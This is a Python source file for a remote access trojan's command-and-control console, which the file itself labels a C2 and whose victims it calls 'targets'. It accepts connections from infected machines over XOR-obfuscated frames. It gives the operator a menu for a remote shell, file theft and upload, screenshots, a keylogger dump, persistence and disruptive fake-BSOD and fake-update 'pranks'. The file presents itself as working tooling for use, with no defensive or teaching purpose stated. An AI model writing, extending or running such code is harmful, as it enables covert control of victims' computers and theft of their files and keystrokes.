#!/usr/bin/env python3
# rat/server.py — C2 console. python 3.9+, stdlib only.
# usage: python server.py
import socket, threading, json, struct, base64, os, sys, time, uuid

CFG = {
    "HOST": "0.0.0.0",
    "PORT": 6767,
    "BUF_CAP": 8 * 1024 * 1024,   # hard ceiling on any inbound frame
    "TIMEOUT": 180,               # per-command socket timeout
    "KEY": b"6767",               # wire obfuscation (not crypto)
}

CLIENTS = {}          # cid -> {"conn", "addr", "info", "lock"}
CLIENTS_LOCK = threading.Lock()


def xor_bytes(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def send_frame(conn: socket.socket, obj: dict) -> None:
    raw = xor_bytes(json.dumps(obj).encode("utf-8"), CFG["KEY"])
    conn.sendall(struct.pack(">I", len(raw)) + raw)


def recv_exact(conn: socket.socket, n: int) -> bytes:
    chunks = []
    got = 0
    while got < n:
        chunk = conn.recv(min(65536, n - got))
        if not chunk:
            raise ConnectionError("peer closed")
        chunks.append(chunk)
        got += len(chunk)
    return b"".join(chunks)


def recv_frame(conn: socket.socket) -> dict:
    head = recv_exact(conn, 4)
    (size,) = struct.unpack(">I", head)
    if size <= 0 or size > CFG["BUF_CAP"]:
        raise ValueError(f"frame size {size} outside bounds")
    raw = recv_exact(conn, size)
    return json.loads(xor_bytes(raw, CFG["KEY"]))


def drop_client(cid: str) -> None:
    with CLIENTS_LOCK:
        c = CLIENTS.pop(cid, None)
    if c:
        try:
            c["conn"].close()
        except OSError:
            pass
        print(f"[-] target {cid} dropped ({c['addr'][0]})")


def accept_loop(server: socket.socket) -> None:
    while True:
        try:
            conn, addr = server.accept()
        except OSError:
            return
        conn.settimeout(CFG["TIMEOUT"])
        try:
            hello = recv_frame(conn)
        except Exception:
            try:
                conn.close()
            except OSError:
                pass
            continue
        cid = hello.get("id") or uuid.uuid4().hex[:8]
        with CLIENTS_LOCK:
            old = CLIENTS.get(cid)
            if old:
                try:
                    old["conn"].close()
                except OSError:
                    pass
            CLIENTS[cid] = {"conn": conn, "addr": addr, "info": hello, "lock": threading.Lock()}
        print(f"[+] target {cid} checked in from {addr[0]}  ({hello.get('os', '?')} / {hello.get('user', '?')})")


def call_target(cid: str, obj: dict) -> dict:
    with CLIENTS_LOCK:
        c = CLIENTS.get(cid)
    if not c:
        return {"ok": False, "err": "no such target"}
    try:
        with c["lock"]:
            send_frame(c["conn"], obj)
            c["conn"].settimeout(CFG["TIMEOUT"])
            return recv_frame(c["conn"])
    except Exception as e:
        drop_client(cid)
        return {"ok": False, "err": f"link dead: {e}"}


def save_b64(data_b64: str, path: str) -> str:
    with open(path, "wb") as f:
        f.write(base64.b64decode(data_b64))
    return path


PRANKS = [
    "msgbox", "speak", "jiggle", "cdtray", "volume", "invert",
    "fakeupdate", "webpage", "spiral", "wallpaper", "bsod", "stop",
]


def pranks_menu(cid: str) -> None:
    print("  pranks: " + ", ".join(PRANKS[:-1]) + "  |  stop kills all")
    names = input("  prank(s)> ").strip().split()
    if not names:
        return
    for n in names:
        if n not in PRANKS:
            print(f"  unknown prank {n}")
            continue
        extra = {}
        if n == "msgbox":
            extra["text"] = input("  text> ") or "hello :)"
        if n == "speak":
            extra["text"] = input("  text> ") or "your computer has been annexed"
        if n == "webpage":
            extra["url"] = input("  url> ") or "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
        r = call_target(cid, {"cmd": "prank", "name": n, **extra})
        print("  " + ("ok" if r.get("ok") else f"err: {r.get('err')}"))


def target_menu(cid: str) -> None:
    MENU = (
        "  [1] shell      [2] ls        [3] dl file\n"
        "  [4] ul file    [5] screenshot\n"
        "  [6] keylog on/off/dump\n"
        "  [7] pranks     [8] sysinfo   [9] persist\n"
        "  [10] disconnect [11] back\n"
    )
    while True:
        print(MENU)
        choice = input(f"  {cid}> ").strip()
        if choice == "1":
            while True:
                line = input("  shell> ").strip()
                if line.lower() in ("exit", "back"):
                    break
                r = call_target(cid, {"cmd": "shell", "line": line})
                print(r.get("out") or r.get("err") or "")
        elif choice == "2":
            r = call_target(cid, {"cmd": "ls", "path": input("  path> ") or "."})
            print(r.get("out") or r.get("err") or "")
        elif choice == "3":
            remote = input("  remote file> ").strip()
            r = call_target(cid, {"cmd": "dl", "path": remote})
            if r.get("ok"):
                print("  saved:", save_b64(r["data"], os.path.basename(remote) or "dump.bin"))
            else:
                print("  err:", r.get("err"))
        elif choice == "4":
            local = input("  local file> ").strip()
            remote = input("  remote path> ").strip() or os.path.basename(local)
            try:
                with open(local, "rb") as f:
                    blob = base64.b64encode(f.read()).decode()
                if len(blob) > CFG["BUF_CAP"] // 2:
                    print("  file too large for frame")
                    continue
            except OSError as e:
                print("  err:", e)
                continue
            r = call_target(cid, {"cmd": "ul", "path": remote, "data": blob})
            print("  ok" if r.get("ok") else f"  err: {r.get('err')}")
        elif choice == "5":
            r = call_target(cid, {"cmd": "ss"})
            if r.get("ok"):
                name = f"ss_{cid}_{int(time.time())}.png"
                print("  saved:", save_b64(r["data"], name))
            else:
                print("  err:", r.get("err"))
        elif choice == "6":
            mode = input("  on/off/dump> ").strip().lower()
            r = call_target(cid, {"cmd": "keylog", "mode": mode})
            if mode == "dump" and r.get("ok"):
                print(r.get("out") or "(empty)")
            else:
                print("  ok" if r.get("ok") else f"  err: {r.get('err')}")
        elif choice == "7":
            pranks_menu(cid)
        elif choice == "8":
            r = call_target(cid, {"cmd": "sysinfo"})
            print(json.dumps(r.get("info", r), indent=2, ensure_ascii=False))
        elif choice == "9":
            r = call_target(cid, {"cmd": "persist"})
            print("  ok" if r.get("ok") else f"  err: {r.get('err')}")
        elif choice == "10":
            call_target(cid, {"cmd": "die"})
            drop_client(cid)
            return
        elif choice == "11":
            return


def main() -> None:
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((CFG["HOST"], CFG["PORT"]))
    srv.listen(16)
    threading.Thread(target=accept_loop, args=(srv,), daemon=True).start()
    print(f"[*] listener up on {CFG['HOST']}:{CFG['PORT']}. type LIST or USE <n>.")
    while True:
        cmd = input("c2> ").strip()
        if cmd.upper() == "LIST":
            with CLIENTS_LOCK:
                items = list(CLIENTS.items())
            if not items:
                print("  rail empty. waiting for check-ins.")
            for i, (cid, c) in enumerate(items):
                info = c["info"]
                print(f"  [{i}] {cid}  {c['addr'][0]}  {info.get('os', '?')}  {info.get('user', '?')}")
        elif cmd.upper().startswith("USE"):
            parts = cmd.split()
            with CLIENTS_LOCK:
                items = list(CLIENTS.keys())
            try:
                cid = items[int(parts[1])]
            except (IndexError, ValueError):
                print("  USE <index from LIST>")
                continue
            if cid in CLIENTS:
                target_menu(cid)
        elif cmd:
            print("  LIST / USE <n>")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[*] console down")
        sys.exit(0)
